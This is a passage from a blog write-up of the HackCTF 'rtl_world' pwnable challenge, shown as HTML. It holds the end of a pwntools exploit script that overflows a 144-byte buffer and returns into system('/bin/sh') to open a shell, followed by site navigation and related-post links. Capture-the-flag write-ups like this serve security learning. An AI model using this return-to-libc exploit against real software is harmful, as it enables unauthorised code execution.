<span class="c1">#gdb.attach(p, 'b*0x08048bec')
#pop_ret = 0x8048545
</span>
<span class="n">system</span> <span class="o">=</span> <span class="mh">0x80485b0</span>
<span class="n">binsh</span> <span class="o">=</span> <span class="mh">0x8048eb1</span>

<span class="k">print</span> <span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="mi">5</span><span class="p">))</span>
<span class="k">print</span> <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"[Attack] &gt; "</span><span class="p">)</span>

<span class="n">payload</span> <span class="o">=</span> <span class="s">''</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">144</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"AAAA"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">binsh</span><span class="p">)</span>

<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></table></code></div></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/writeup/'>WriteUp</a>, <a href='/categories/pwnable/'>Pwnable</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/writeup/" class="post-tag no-text-decoration" >WriteUp</a> <a href="/tags/hackctf/" class="post-tag no-text-decoration" >HackCTF</a> <a href="/tags/pwnable/" class="post-tag no-text-decoration" >Pwnable</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=HackCTF rtl_world - Ph4nt0m&url=https://phantomn.github.io/posts/HackCTF-rtl_world/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=HackCTF rtl_world - Ph4nt0m&u=https://phantomn.github.io/posts/HackCTF-rtl_world/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=HackCTF rtl_world - Ph4nt0m&url=https://phantomn.github.io/posts/HackCTF-rtl_world/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/HackCTF-Smooth_CipherText/">HackCTF Smooth CipherText</a><li><a href="/posts/HackCTF-RTL_core/">HackCTF RTL_core</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/hackctf/">HackCTF</a> <a class="post-tag" href="/tags/writeup/">WriteUp</a> <a class="post-tag" href="/tags/pwnable/">Pwnable</a> <a class="post-tag" href="/tags/crypto/">Crypto</a> <a class="post-tag" href="/tags/reversing/">Reversing</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/HackCTF-x64_Buffer_Overflow/"><div class="card-body"> <span class="timeago small" > Mar 31 <i class="unloaded">2021-03-31T17:00:00+09:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackCTF x64 Buffer Overflow</h3><div class="text-muted small"><p> x64 Buffer Overflow Source 1 2 3 4 5 6 7 8 9 10 int __cdecl main(int argc, const char **argv, const char **envp) { char s[268]; // [rsp+10h] [rbp-110h] int v5; // [rsp+11Ch] [rbp-4h] _isoc...</p></div></div></a></div><div class="card"> <a href="/posts/HackCTF-x64_Simple_size_BOF/"><div class="card-body"> <span class="timeago small" > Mar 31 <i class="unloaded">2021-03-31T17:00:00+09:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackCTF x64 Simple_size_BOF</h3><div class="text-muted small"><p> x64 Simple_size_BOF Source 1 2 3 4 5 6 7 8 9 10 int __cdecl main(int argc, const char **argv, const char **envp) { char v4[27952]; // [rsp+0h] [rbp-6D30h] setvbuf(_bss_start, 0LL, 2, 0LL); ...</p></div></div></a></div><div class="card"> <a href="/posts/HackCTF-yes_or_no/"><div class="card-body"> <span class="timeago small" > Mar 31 <i class="unloaded">2021-03-31T17:00:00+09:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackCTF x64 yes_or_no</h3><div class="text-muted small"><p> yes_or_no Source 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 int __cdecl main(int argc, const c...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/HackCTF-keygen/" class="btn btn-outline-primary" prompt="Older"><p>HackCTF keygen</p></a> <a href="/posts/HackCTF-strncmp/" class="btn btn-outline-primary" prompt="Newer"><p>HackCTF strncmp</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2021 <a href="https://www.facebook.com/Ph4ntomn">Ph4nt0m</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/hackctf/">HackCTF</a> <a class="post-tag" href="/tags/writeup/">WriteUp</a> <a class="post-tag" href="/tags/pwnable/">Pwnable</a> <a class="post-tag" href="/tags/crypto/">Crypto</a> <a class="post-tag" href="/tags/reversing/">Reversing</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://phantomn.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
